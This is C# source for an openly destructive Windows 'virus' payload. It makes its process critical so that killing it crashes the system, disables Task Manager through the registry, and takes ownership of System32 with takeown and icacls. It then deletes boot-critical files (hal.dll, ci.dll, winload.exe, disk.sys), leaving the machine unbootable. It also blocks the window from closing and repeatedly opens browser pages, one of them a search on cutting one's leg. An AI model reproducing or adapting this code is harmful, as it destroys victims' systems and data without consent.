using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.IO;

namespace Virus_Destructive
{
    public partial class Virus_payload : Form
    {

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

    public Virus_payload()
    {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
            TopMost = true;
            r = new Random();
    }
        Random r;

        private void Virus_payload_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void Virus_payload_Load(object sender, EventArgs e)
        {
            int isCritical = 1;  // we want this to be a Critical Process
            int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)

            Process.EnterDebugMode();  //acquire Debug Privileges

            // setting the BreakOnTermination = 1 for the current process
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            RegistryKey rk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rk.SetValue("DisableTaskMgr", 1, RegistryValueKind.String); // turn off task manager

            //get system32 folder and drivers
            new Process() { StartInfo = new ProcessStartInfo("cmd.exe", @"/k color 47 && takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant %username%:F && takeown /f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant %username%:F && Exit") }.Start();
            tmr1.Start();
            tmr_add.Start();
            tmr_next_payload.Start();
        }

        private void tmr1_Tick(object sender, EventArgs e)
        {
            tmr1.Stop();
            //Path sys files and folders
            string hal_dll = @"C:\Windows\System32\hal.dll";
            string ci_dll = @"C:\Windows\System32\ci.dll";
            string winload_exe = @"C:\Windows\System32\winload.exe";
            string disk_sys = @"C:\Windows\System32\drivers\disk.sys";

            //Delete system files
            if(File.Exists(hal_dll))
            {
                File.Delete(hal_dll);
            }

            if (File.Exists(ci_dll))
            {
                File.Delete(ci_dll);
            }

            if (File.Exists(winload_exe))
            {
                File.Delete(winload_exe);
            }

            if (File.Exists(disk_sys))
            {
                File.Delete(disk_sys);
            }
        }

        private void tmr_add_Tick(object sender, EventArgs e)
        {
            tmr_add.Stop();
            int true_num = r.Next(5); //make random num 1-5

            if(true_num == 1)
            {
                System.Diagnostics.Process.Start("https://www.youtube.com/channel/UC9keh4wDjXFyiRhHDE_h90Q?view_as=subscriber");
            }

            if (true_num == 2)
            {
                System.Diagnostics.Process.Start("https://www.youtube.com/channel/UCviSYAcwdnDX1UoRzAHYgNg");
            }

            if (true_num == 3)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?sxsrf=ALeKk03p6_nh5gjKk_7WWWGDr0qYtnieXg%3A1605092222038&ei=fsOrX5rzAY63kwWYq56IDg&q=my+mum+is+gay&oq=my+mum+is+gay&gs_lcp=CgZwc3ktYWIQAzIKCAAQFhAKEB4QEzIKCAAQFhAKEB4QEzoJCCMQ6gIQJxATOgcIIxDqAhAnOgQIIxAnOgUIABCxAzoCCAA6CAgAELEDEIMBOgIILjoECAAQQzoHCC4QsQMQQzoECC4QQzoFCC4QsQM6CAguELEDEIMBOgUILhCTAjoECC4QCjoECAAQCjoFCC4QywE6BQgAEMsBOggILhDLARCTAjoGCAAQFhAeOggIABAWEAoQHlD_GliuO2D3PGgCcAB4AIABiwKIAeAOkgEGMS4xMi4xmAEAoAEBqgEHZ3dzLXdperABCsABAQ&sclient=psy-ab&ved=0ahUKEwiaque9qvrsAhWO26QKHZiVB-EQ4dUDCA0&uact=5");
            }

            if (true_num == 4)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?sxsrf=ALeKk007atE4-A-mD40nsEcYaIJklYlv_g%3A1605092231197&ei=h8OrX5XEC4mdkwXO84XoAg&q=how+2+cut+leg&oq=how+2+cut+leg&gs_lcp=CgZwc3ktYWIQDDIICCEQFhAdEB4yCAghEBYQHRAeMggIIRAWEB0QHjIICCEQFhAdEB4yCAghEBYQHRAeMggIIRAWEB0QHjIICCEQFhAdEB4yCAghEBYQHRAeMggIIRAWEB0QHjoJCCMQ6gIQJxATOgcIIxDqAhAnOgQIIxAnOgQIABBDOgUIABCxAzoKCAAQsQMQgwEQQzoCCC46CAguELEDEIMBOgIIADoFCC4QsQM6BQguEMsBOgUIABDLAToGCAAQFhAeOggIABAWEAoQHlDzaFiDigFg86UBaANwAHgAgAHzAYgB7w2SAQYwLjEyLjGYAQCgAQGqAQdnd3Mtd2l6sAEKwAEB&sclient=psy-ab&ved=0ahUKEwjVo5bCqvrsAhWJzqQKHc55AS0Q4dUDCA0");
            }

            if (true_num == 5)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=dancing+cow&sxsrf=ALeKk03Rx29J4Nduy2BetYRf6PUHNs9I8A:1605092295881&source=lnms&tbm=isch&sa=X&ved=2ahUKEwiupoLhqvrsAhUdJcUKHdqKANwQ_AUoAXoECAcQAw&biw=1920&bih=937");
            }
            tmr_add.Start();
        }

        private void tmr_next_payload_Tick(object sender, EventArgs e)
        {
            tmr_next_payload.Stop();
            var NewForm = new Virus_sound();
            NewForm.ShowDialog();
        }
    }
}
